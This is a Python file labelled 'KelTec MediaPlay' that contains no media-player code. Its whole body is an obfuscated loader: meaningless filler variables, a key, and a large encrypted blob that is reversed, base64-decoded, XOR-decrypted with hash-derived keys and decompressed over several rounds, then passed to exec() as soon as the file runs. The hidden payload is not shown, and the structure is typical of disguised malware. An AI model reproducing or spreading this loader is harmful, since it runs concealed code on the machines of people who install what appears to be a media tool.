# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 346032 ^ 835982
_lx1_1 = len("98fab5")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-777966)
_lx3_3 = 571782 * 0
_lx4_4 = 802557 ^ 510013
_K = 'd428ab24087471b498bf9180c6f10deaa1555eaaf91b45b70d6b09401893e773'
_M = 'V3t6W3zjoeUeNUsiLQySGUeZAGZS3ts0MmVIwSBIjFAcK2QBP/r2vhVlSX16XZNCEs0DMQ7fjzRlME+Vch6JBRUlNQE2rPG8QmVA'
_D = '=4SANYMTX5r+58/ptoGWeTbLbSF5Zc+Iiq563QYIqYPbHNOHQBxZSR0QR4Dtt1QA1zUj2mngLFRA5isxvrau7h1QqpZinI97NfRTZYIvDw//naL9IJ/tVfrCXOKnZsJoXp5aWdOnjyt5ghrNzsdI1RA8JOhSgIwdhMtkVQ+Uvp5VEYN6g51AdYJbTEW+VFr8h95PAGPbOgLnb9XNi5GTumyJzELy6XDmPRNQCPnI2dl0l0LCLiTAX4Lrp++Ukcqa9KdihmAMeaaCgmjtXp0iojKV7JghT96ktgWyfUf4C2VEPPaiB31OsKm9zi75agubNRj8Cf5OPjmuRPkwHaNi2Pua+zcfrRqbC3bEIul3/vaLdJ5lz72X6AypKbcBHw+MI1qnf+KIryfoTAglKSK9psuTQpfFDIIP/zuPHvdiTlK084p3QzObVTSC8O8tqQGO/a363hSYZOSV+NztlZL1HiaqNfYfXmqUNg3zmDfgwFd5oioQjvy22p2+f4VyThb0+I21IZAfagKh5nKiYxO3Gsy9v0VZXJQF3rTVdLp97bl7tr+sO6cVyZgo/XzX9lyGbBdDAxPL68GsMg5kpDUwzesopuqrIj1HwoeKRSpy7OEdvuQQqaaTioacgPosFR74lLql044CDfrtwKHUiq7sLWqs64XWgqHcmcGIBCrrenVahzqnd7nrgvS1vpeABYW/Y8ZLdXvGjAFXlMuSbLDxdhRLVkocjHw+gpzAmGApETDtHjHbKqSJ4Ld2mnooY5JXdXgJd7ewVwPh8dP73iMaLqj8er46N6NuLVlhhxtgmf3D93oSQh6nvvUlTMhl+LBd0SuE8qrpmSXA/hVahMsCgZKKl90MOsdmpoFF+cakWUs+N9XK0Ir+gIhtytVr9DLqlsn/vuB+InVhZDa+JXUV8GZoL7ehfg+iqfTKCQPINw6nWJO90plSrUUZYNGBUIS26JR9WisHCMSrD9T07V2Iuaj4Z79RkLgJObIz183TQ0+kiOC5MYbTew/rDthdsis6A8JhgVbvIRSpbgDTrAvxywm3ckTq15w4juZe7HCubVltPtOyrND4dXcilN7DD+oF06LVraxDcTXcLtHXG7H1qJw06PVINdy6mkdjxK1UCn9asyWOu4JY5BaYg/MkfiUXG6zMLkmEXxsOJPsHYKnLMVNiXBrfQuXm6c8sEzhr/P82qSaCKODRjs4KW172JO6bFXAZN3lBdc70brLDm4adu38ZDptVWv/8HjG1JR5nTUzBzQVWxfNOk68KtpVslHzHKTFpjeBZ9ul7Js4NJWMGWPkm82eLhxbNjwYfnF9E91QYPZYW3Jxdlc8Wjqp+StuLGAHUpcn6+hk4eYAqU6qYqlIhUXMGoEastwBWnf5QiSeJCEXuWNGirJDYTN9zfGz9vlD0OrAxPLiOi+0Aroyb5s/Hr6D5Bxf/NpZB53VtXlQ2iunQ0O5haqPkRbb6zuyvKazUmP8TikHDaguhOEokbTVIsoWuazxTqDSlSkd8eSOqq+RaI+8GE70FTzTaS9x1OK5iPz2n527Ky4Pf1XsR1b2T5Ae7OhN+VKWYNHHcd3WlUNnGC4qBFukuqyPF1kjEqMbtT2AAnPXjI8hM6NwEV/I8pyvTaWQpSF6LA+lncS6eLNYy2yXtODsS3ibESKa6nriMz1ahnRsOeK2kEo45YH7pRbYhiP6qEwsIduh0CjyoQw0kFv9jAFJpsBKJ5SI+NC6GGi0Ggt3qU07YD/SraFB0Mdlfm9b4TQbZfYTXF5fthylBMdPFVsYifukE/DylgdJiIAt7WGUoA0xzYGT4SmkgdxL/Hui5oIp5J/qmTTX6ht5DjyMzQ0S8RrBBy3qklKAdfzy+ZAtor3zS'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    exec(compile(src,'<mediaplay>','exec'),{'__name__':'__main__','__file__':__file__})
_run()